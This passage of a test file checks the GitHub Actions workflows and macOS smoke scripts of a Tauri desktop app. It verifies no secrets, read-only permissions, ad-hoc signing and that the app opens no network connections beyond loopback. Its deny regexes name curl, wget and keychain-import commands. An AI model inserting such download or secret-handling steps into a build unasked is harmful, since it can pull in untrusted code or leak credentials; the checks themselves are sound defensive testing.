    const withComment = good.replace("jobs:\n", "jobs:\n  # secrets.FOO and pull_request_target are only words here\n");
    expect(problems("release.yml", withComment)).toEqual([]);
  });
});

describe("the macOS build and smoke job in desktop-smoke.yml", () => {
  const text = workflow("desktop-smoke.yml");
  const job = split(text).jobs.find((j) => j.name === "macos-universal-build");
  const body = (): string => code(job!.lines).join("\n");
  const smokeScript = readFileSync(path.join(repo, "apps", "app", "tools", "macos", "smoke.sh"), "utf8");
  const netwatch = readFileSync(path.join(repo, "apps", "app", "tools", "macos", "netwatch.py"), "utf8");

  it("exists, runs on macOS with a time limit, and the workflow runs on pull requests and on main", () => {
    expect(job).toBeDefined();
    expect(body()).toMatch(/^ {4}runs-on: macos-latest$/m);
    expect(body()).toMatch(/^ {4}timeout-minutes: \d+$/m);
    const on = /^on:\n((?:[ ]{2}.*\n|\n)*)/m.exec(text)![1]!;
    expect(on).toMatch(/push:\s*\n\s+branches: \[main\]/);
    expect(on).toMatch(/pull_request:/);
  });

  it("holds no secret, no environment and no write permission, and every action in it is pinned", () => {
    expect(problems("desktop-smoke.yml", text)).toEqual([]);
    expect(namesSecrets(job!.lines)).toBe(false);
    expect(body()).not.toMatch(/^ {4}environment:/m);
    expect(body()).toMatch(/^ {4}permissions:\n {6}contents: read$/m);
    expect(body()).not.toMatch(/\bwrite\b/);
    // Ad hoc signing only, from the "-" in tauri.macos.conf.json: no Apple variable at all, no certificate, no notarization.
    expect(body()).not.toMatch(/\bAPPLE_[A-Z_]+/);
    expect(body()).not.toMatch(/notarytool|stapler|security import|create-keychain|\.p12|\bcurl\b|\bwget\b/);
  });

  it("builds the universal app and disk image unsigned and locked, from both Rust targets, after the unit tests", () => {
    const b = body();
    expect(b).toMatch(/rustup target add aarch64-apple-darwin x86_64-apple-darwin/);
    expect(b).toMatch(/cargo test --lib --locked/);
    expect(b).toMatch(/build --target universal-apple-darwin --bundles dmg,app -- --locked/);
    expect(b.indexOf("cargo test --lib --locked")).toBeLessThan(b.indexOf("--target universal-apple-darwin"));
    expect(b).toMatch(/npm ci --ignore-scripts/);
    expect(b).toMatch(/git diff --exit-code -- package-lock\.json apps\/app\/src-tauri\/Cargo\.lock/);
    expect(b).not.toMatch(/dev-hooks/);
  });

  it("runs the smoke script and uploads the disk image, checksums, screenshots, logs and signature output for 14 days", () => {
    const b = body();
    expect(b).toMatch(/run: bash apps\/app\/tools\/macos\/smoke\.sh/);
    const uploads = stepsOf(job!.lines).filter((s) => /actions\/upload-artifact@/.test(s.join("\n")));
    expect(uploads).toHaveLength(2);
    for (const u of uploads) expect(u.join("\n")).toMatch(/retention-days: 14\b/);
    const [files, evidence] = uploads.map((u) => u.join("\n"));
    expect(files).toMatch(/macos-evidence\/files\/\*/);
    expect(evidence).toMatch(/if: always\(\)/);
    for (const kind of ["*.txt", "*.log", "*.png"]) expect(evidence).toContain(`macos-evidence/${kind}`);
  });

  it("has a smoke script that checks what the task says it must", () => {
    for (const needle of [
      "lipo -archs", "Signature=adhoc", "hdiutil verify", "hdiutil attach", "Applications", "codesign -dv --verbose=4", "plutil -p",
      "open -n", "screencapture", "--control", "OBSERVE_SECONDS", "shasum -a 256", "LSMinimumSystemVersion", "public.app-category.utilities",
    ]) {
      expect(smokeScript, needle).toContain(needle);
    }
    // Hardened runtime off, no entitlements, and a hard failure when the app survives the request to quit.
    expect(smokeScript).toMatch(/hardened runtime is on/);
    expect(smokeScript).toMatch(/carries entitlements/);
    expect(smokeScript).toMatch(/ignored SIGTERM/);
    // It uses no secret and does not sign or publish anything.
    expect(smokeScript).not.toMatch(/codesign (--force|-f|-s )|notarytool|stapler|gh release|security import/);
  });

  it("watches the app's WebKit helper processes too, because they are not children of the app, and proves the sampler works first", () => {
    expect(netwatch).toContain("com.apple.WebKit.");
    expect(netwatch).toMatch(/def control\(/);
    // The watch fails when no WebKit networking helper that started after it began is counted as the app's (exit 6), so a helper
    // that a newer macOS reuses from before cannot silently leave the app's connections out; smoke.sh fails on that code.
    expect(netwatch).toContain('WEBKIT_NETWORKING = "com.apple.WebKit.Networking"');
    expect(netwatch).toMatch(/if not networking_pids\(r\):[\s\S]*?return 6/);
    expect(smokeScript).toMatch(/\n  6\) fail "no WebKit networking helper/);
    // The positive control runs before the app is started.
    expect(smokeScript.indexOf("--control")).toBeLessThan(smokeScript.indexOf('open -n "$APPS/Snappy.app"'));
    // Loopback is the only address that is not counted.
    expect(netwatch).toContain('LOOPBACK = re.compile(r"^(127\\.|::1$|::ffff:127\\.|localhost$)"');
  });

  it("also runs a WebKit stand-in that only talks to a loopback server, judges every channel on its own page load, and fails if a locked run got any request through", () => {
    const dir = path.join(repo, "apps", "app", "tools", "macos");
    const probe = readFileSync(path.join(dir, "probe.sh"), "utf8");
    const swift = readFileSync(path.join(dir, "webkit-probe.swift"), "utf8");
    const server = readFileSync(path.join(dir, "probe-server.py"), "utf8");
    expect(smokeScript).toMatch(/bash "\$HERE\/probe\.sh"/);
    // Every channel is judged one by one, and one page load per navigation, so one channel cannot hide another.
    expect(probe).toMatch(/for scenario in \$SCENARIOS; do run_probe locked/);
    expect(probe).toMatch(/run_probe control "\$scenario"/);
    expect(probe).toMatch(/\[ "\$SHOWN" = "0" \]/); // no verdict when the control showed no channel
    expect(probe).toMatch(/\[ -n "\$LEAKED" \]/); // a locked-run request on any channel is a failure
    expect(probe).toContain("SCENARIOS=\"subresources link-self form location-replace location-href\"");
    // The sampler must list a socket of the WebKit networking helper while the stand-in's control run talks to the server.
    expect(probe).toMatch(/netwatch\.py" --log "\$OUT\/webkit-control-sockets\.log" .*--require-webkit-socket/);
    expect(server).toContain('("127.0.0.1", 0)');
    expect(server).toContain('"/hold"');
    expect(swift).toContain("decidePolicyFor");
    expect(swift).toContain("createWebViewWith");
    expect(swift).toContain("tauri://localhost");
    // The new-window refusal applies only to the locked run; the control opens the window for real.
    expect(swift).toMatch(/if locked \{\s*print\("refused new window/);
    // The Save click: the same decision wry makes, with and without a download handler.
    expect(swift).toContain("shouldPerformDownload");
    expect(probe).toContain("download-handler");
    expect(probe).toContain("download-nohandler");
    // No address in these files except the loopback test server (netwatch.py's control connection is the one deliberate exception).
    for (const text of [probe, swift, server]) {
      const hosts = [...text.matchAll(/(?:https?|wss?):\/\/([A-Za-z0-9.-]+)/g)].map((m) => m[1]);
      expect(hosts.filter((h) => h !== "127.0.0.1")).toEqual([]);
    }
  });

  it("leaves no temporary workflow behind", () => {
    expect(workflowFiles().filter((f) => /tmp|temp/i.test(f))).toEqual([]);
  });
});

describe("release.yml builds the macOS app the same way as CI: one universal app, unsigned, ad hoc", () => {
  const text = workflow("release.yml");
  const desktop = split(text).jobs.find((j) => j.name === "desktop")!;
  const signMac = split(text).jobs.find((j) => j.name === "sign-macos")!;

  it("has one macOS row, universal, with dmg and app, and no separate Intel or Apple silicon row", () => {
    const rows = code(desktop.lines).join("\n");
    expect(rows).toMatch(/name: macos-universal\n\s+os: macos-latest\n\s+bundles: dmg,app\n\s+target: universal-apple-darwin/);
    expect(rows).not.toMatch(/macos-arm64|macos-x64/);
    expect(rows).toMatch(/rustup target add aarch64-apple-darwin x86_64-apple-darwin/);
    expect(code(signMac.lines).join("\n")).toMatch(/name: \[macos-universal\]/);
  });

  it("stays unsigned in the build job: ad-hoc identity only, and the sign job stays behind the release environment", () => {
    const rows = code(desktop.lines).join("\n");
    expect(rows).toMatch(/export APPLE_SIGNING_IDENTITY="-"/);
    expect(namesSecrets(desktop.lines)).toBe(false);
    expect(code(signMac.lines).join("\n")).toMatch(/environment: release/);
    expect(code(signMac.lines).join("\n")).toMatch(/needs\.verify\.outputs\.official == 'true'/);
  });
});
